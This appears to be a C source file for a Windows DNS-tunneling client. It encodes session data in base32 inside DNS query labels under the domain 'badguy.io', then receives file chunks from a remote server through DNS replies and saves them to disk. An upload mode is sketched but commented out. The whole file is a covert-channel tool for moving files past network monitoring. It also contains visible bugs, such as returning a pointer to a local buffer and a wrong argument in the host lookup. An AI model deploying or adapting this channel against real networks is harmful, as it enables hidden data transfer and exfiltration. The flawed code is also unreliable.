#define WIN32_LEAN_AND_MEAN
#define NOGDI
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>
#include <stdint.h>
#include <rpc.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#include <ws2def.h>
#include <sys/types.h>

#include "dns.h"
#include "payload.h"
#include "filehandler.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment (lib, "Rpcrt4.lib")

#define DEFAULT_BUFLEN 512
#define UUIDLEN 16
#define WAIT 3

// -----------------------------------------------------
void print_buffer(unsigned char *buffer, size_t len);
void usage(char **);
void get_ip_server(char *,char **);
void downloader(struct dns_payload *, int, struct sockaddr_in sockaddr);
void send_request(unsigned char *, size_t ,
                int , struct sockaddr_in);
int base32_decode(const uint8_t *encoded, uint8_t *result, int bufSize);
int base32_encode(const uint8_t *data, int length, uint8_t *result, int bufSize);
void extract_dns_query(unsigned char *dns_buffer, struct dns_query *name_query);
struct dns_payload * get_respayload(struct dns_query *dns_query);
void print_uuid(UUID *);
void makeUUID(struct dns_payload *);
BOOL directoryExists(LPCTSTR);
BOOL createDirectory(LPCTSTR);
void save_data(struct dns_query *);
// ----------------------------------------------------------

int main(int argc,char **argv) {
    // add argument
    if( argc < 3 && strcmp(argv[1],"--download") && strcmp(argv[1],"--upload"))
    {
        usage(argv);
        exit(-1);
    }

    // send request action to download file A
    // prepare uuid 
    struct dns_payload payload;
    makeUUID(&payload);
    
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }

    // prepare ip 
    char IPbuffer[100];
    get_ip_server(IPbuffer,argv);
    printf("IP: %s\n",IPbuffer);
    
    // init socket 
    int sockfd;
    if((sockfd=socket(AF_INET,SOCK_DGRAM,0)) < 0)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in sockaddr;
    sockaddr.sin_addr.S_un.S_addr = inet_addr(IPbuffer);
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port = htons(DNS_PORT);
    // prepare action
    int action = 0;
    if( !strcmp(argv[1],"--download"))
        action = 2;
    else action =1;
    if(action == 2)
        downloader(&payload, sockfd, sockaddr);
    // else if( action == 1)
    //     uploader(&payload);
    return 0;
}

void usage(char **args){
    printf("Usage: %s [OPTION]... [domain [domain name] | ip [ipserver]]\n\n",args[0]);
    printf("OPTION:\n");
    printf("\t--download\t\tDownload file A from server\n");
    printf("\t--upload [filename]\t\tUpload file to server");
}

void get_ip_server(char *ip,char **args){
    if( !strcmp(args[3],"domain"))
    {
        printf("domain : %s\n",args[4]);
        struct hostent *host = gethostbyname(args[4]);
         host = gethostbyname(args[3]);
        if (host) {
            strcpy(ip,inet_ntoa(*((struct in_addr*)host->h_addr_list[0])));
            return;
        } else {
            fprintf(stderr, "Unable to resolve %s\n", args[4]);
            exit(EXIT_FAILURE);
        }
    }
    else if( !strcmp(args[3],"ip"))
    {
        strcpy(ip,args[4]);
        return;
    }
    else {
        usage(args);
        exit(1);
    }
}

void send_request(unsigned char *name_prefix_buf, size_t name_prefix_size,
                int sockfd, struct sockaddr_in sockaddr){
    unsigned char dns_buf[1024];
    memset(dns_buf, 0, 1024);

    struct dns_header *header = (struct dns_header *)dns_buf;
    header->id = htons(1337);
    header->rd = 1;
    header->qdcount = htons(1);
    
    unsigned char *dns_buf_ptr = dns_buf + sizeof(struct dns_header);
    int num_labels = name_prefix_size / 60 + (name_prefix_size % 60 ? 1 : 0);
    
    for (int i = 0; i < num_labels; ++i) {
        int start = i * 60;
        size_t count =
            (start + 60 <= name_prefix_size) ? 60 : name_prefix_size - start;
        
        *dns_buf_ptr = (unsigned char)count;
        memcpy(dns_buf_ptr + 1, name_prefix_buf + start, count);
        dns_buf_ptr += count + 1;
    }
    
    *dns_buf_ptr = (unsigned char)6;
    memcpy(dns_buf_ptr + 1, "badguy", 6);
    *(dns_buf_ptr + 7) = (unsigned char)2;
    memcpy(dns_buf_ptr + 8, "io", 2);
    
    *(dns_buf_ptr + 10) = (unsigned char)0;
    *((uint16_t *)(dns_buf_ptr + 11)) = htons(1);
    *((uint16_t *)(dns_buf_ptr + 13)) = htons(1);
    size_t buf_size = dns_buf_ptr + 15 - dns_buf;
    
    printf("Sent:\n");
    print_buffer(dns_buf, buf_size);
    if (sendto(sockfd, dns_buf, buf_size, 0,
             (struct sockaddr *)&sockaddr, sizeof(struct sockaddr_in)) == -1) {
        perror("sendto failed");
        exit(EXIT_FAILURE);
    }
}

void downloader(struct dns_payload *payload, int sockfd, struct sockaddr_in sockaddr){
    
    payload->action = 2;
    payload->length = 0;
    unsigned char base32_data_buf[256];
    printf("payload:\n");
    print_buffer((unsigned char *)payload, sizeof(struct dns_payload) - BLOCKSIZE);
    
    size_t num_written = base32_encode(
        (uint8_t *)payload,
        sizeof(struct dns_payload) - BLOCKSIZE + payload->length,
        (uint8_t *)base32_data_buf,256
    );
    base32_data_buf[num_written] = '\0';

    send_request(base32_data_buf, num_written, sockfd, sockaddr);
    unsigned char buffer[MAX_BUFFER_SIZE];
    for(;;){
        memset(buffer, 0, sizeof(buffer));
        socklen_t socklen = sizeof(struct sockaddr_in);
        int num_received = recvfrom(sockfd, (char *)buffer, MAX_BUFFER_SIZE,
                                0, (struct sockaddr *)&sockaddr, &socklen);
        if(num_received == -1)
        {
            perror("receive failed");
            exit(EXIT_FAILURE);
        }
        print_buffer(buffer, num_received);
        // struct dns_header *header = (struct dns_header *)buffer;
        struct dns_query name_query;
        extract_dns_query(buffer, &name_query);
        struct dns_payload * res_payload = get_respayload(&name_query);
        if( res_payload->action == 3) {
            save_data(&name_query);
            // send response
            struct dns_payload req_payload;
            req_payload.action = res_payload->action;
            req_payload.length = res_payload->length;
            req_payload.sequence = res_payload->sequence;
            strncpy(req_payload.data,res_payload->data,res_payload->length);
            strncpy(req_payload.uuid,res_payload->uuid,sizeof(_uuid_dt));
            size_t num_written = base32_encode((uint8_t *)&req_payload,
                                    sizeof(struct dns_payload) - BLOCKSIZE + req_payload.length,
                                    (uint8_t *)base32_data_buf,256);
            base32_data_buf[num_written] = '\0';
            send_request(base32_data_buf,num_written,sockfd,sockaddr);
        }
        if( res_payload->action == 0)
        {
            printf("action : 0\n");
            break;
        }
    }
    close(sockfd);
}

int base32_decode(const uint8_t *encoded, uint8_t *result, int bufSize) {
  int buffer = 0;
  int bitsLeft = 0;
  int count = 0;
  for (const uint8_t *ptr = encoded; count < bufSize && *ptr; ++ptr) {
    uint8_t ch = *ptr;
    if (ch == ' ' || ch == '\t' || ch == '\r' || ch == '\n' || ch == '-') {
      continue;
    }
    buffer <<= 5;

    // Deal with commonly mistyped characters
    if (ch == '0') {
      ch = 'O';
    } else if (ch == '1') {
      ch = 'L';
    } else if (ch == '8') {
      ch = 'B';
    }

    // Look up one base32 digit
    if ((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z')) {
      ch = (ch & 0x1F) - 1;
    } else if (ch >= '2' && ch <= '7') {
      ch -= '2' - 26;
    } else {
      return -1;
    }

    buffer |= ch;
    bitsLeft += 5;
    if (bitsLeft >= 8) {
      result[count++] = buffer >> (bitsLeft - 8);
      bitsLeft -= 8;
    }
  }
  if (count < bufSize) {
    result[count] = '\000';
  }
  return count;
}

int base32_encode(const uint8_t *data, int length, uint8_t *result,
                  int bufSize) {
  if (length < 0 || length > (1 << 28)) {
    return -1;
  }
  int count = 0;
  if (length > 0) {
    int buffer = data[0];
    int next = 1;
    int bitsLeft = 8;
    while (count < bufSize && (bitsLeft > 0 || next < length)) {
      if (bitsLeft < 5) {
        if (next < length) {
          buffer <<= 8;
          buffer |= data[next++] & 0xFF;
          bitsLeft += 8;
        } else {
          int pad = 5 - bitsLeft;
          buffer <<= pad;
          bitsLeft += pad;
        }
      }
      int index = 0x1F & (buffer >> (bitsLeft - 5));
      bitsLeft -= 5;
      result[count++] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[index];
    }
  }
  if (count < bufSize) {
    result[count] = '\000';
  }
  return count;
}

void print_buffer(unsigned char *buffer, size_t len) {
  unsigned char preview[17];
  preview[16] = '\0';
  memset(preview, ' ', 16);
  for (int i = 0; i < len; ++i) {
    if (i && i % 16 == 0) {
      printf(" %s\n", preview);
      memset(preview, ' ', 16);
    }
    unsigned char c = buffer[i];
    printf("%02x ", c);
    preview[i % 16] = (c == ' ' || (c >= '!' && c < '~')) ? c : '.';
  }
  for (int i = 0; i < 16 - len % 16; ++i) {
    printf("   ");
  }
  printf(" %s\n", preview);
}

void extract_dns_query(unsigned char *dns_buffer,
                       struct dns_query *name_query) {
    unsigned char *query_ptr = dns_buffer + sizeof(struct dns_header);
    name_query->num_segments = 0;
    uint8_t segment_size;
    while ((segment_size = *((uint8_t *)query_ptr))) {
        if (segment_size > 63) { // malformed request
        return;
        }
        strncpy(name_query->segment[name_query->num_segments],
                (char *)(query_ptr + 1), segment_size);
        name_query->segment[name_query->num_segments][segment_size] = '\0';
        ++name_query->num_segments;
        query_ptr += segment_size + 1;
    }
    uint16_t *qtype_ptr = (uint16_t *)(query_ptr + 1);
    name_query->type = ntohs(*qtype_ptr);
    uint16_t *qclass_ptr = (uint16_t *)(query_ptr + 3);
    name_query->qclass = ntohs(*qclass_ptr);
}

struct dns_payload * get_respayload(struct dns_query * dns_query) {
    uint8_t base32_buf[300] = {0};
    for (int i = 0; i < dns_query->num_segments - 2; ++i) {
        strncat((char *)base32_buf, dns_query->segment[i], 1024);
    }
    uint8_t payload_buf[300];
    base32_decode(base32_buf, payload_buf, 300);
    struct dns_payload *payload = (struct dns_payload *)payload_buf;
    printf("Payload\n");
    print_buffer(payload_buf, sizeof(struct dns_payload) - BLOCKSIZE);
    printf("uuid %s, action %d, sequence %d, length %d\n", payload->uuid, payload->action, payload->sequence,
            payload->length);
    return payload;
}

void print_uuid(UUID *uuid) {
  unsigned char *uTemp;
  if(UuidToString(uuid,&uTemp)==RPC_S_OK){
    printf("UUID : %s\n",uTemp);
  }
  else {
    perror("Out of memory.\n");
    exit(1);
  }
}

void makeUUID(struct dns_payload *payload) 
{
  UUID *session_id = malloc(sizeof(UUID *));
  if(UuidCreate(session_id) != RPC_S_OK)
  {
    perror("Create UUID fail.");
    exit(1);
  }
  unsigned char *uTemp;
  if(UuidToString(session_id,&uTemp)!=RPC_S_OK){
    perror("Failed to convert uuid into string.");
    exit(1);
  }
  print_uuid(session_id);
  int j = 0;
  for(int i = 0 ; i < strlen(uTemp);)
  {
    if( uTemp[i] == (unsigned char)'-')
    {
      i++;
      continue;
    }
    char str[3] = { uTemp[i],uTemp[i+1], '\x0' };
    payload->uuid[j]= (int)strtol(str, NULL, 16); 
    j++;
    i = i + 2;
  }
}

BOOL directoryExists(LPCTSTR szPath)
{
  DWORD dwAttrib = GetFileAttributes(szPath);

  return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
         (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL createDirectory(LPCTSTR szPath)
{
    if(!directoryExists(szPath))
    {
        return CreateDirectory(szPath, NULL) ? TRUE : FALSE;
    }
    else return FALSE;
}

void save_data(struct dns_query *dns_query)
{
    uint8_t base32_buf[300] = {0};
    for (int i = 0; i < dns_query->num_segments - 2; ++i) {
        strncat((char *)base32_buf, dns_query->segment[i], 1024);
    }
    uint8_t payload_buf[300];
    base32_decode(base32_buf, payload_buf, 300);
    struct dns_payload *payload = (struct dns_payload *)payload_buf;
    FILE *fout = fopen("./data/test.txt", "a+b");
    fseek(fout, 120 * payload->sequence, 0);
    fwrite(payload->data, 1, payload->length, fout);
    fclose(fout);
    printf("Wrote %d bytes to %s at offset %d\n", payload->length, "./data/test.txt",
            payload->sequence * 120);
}

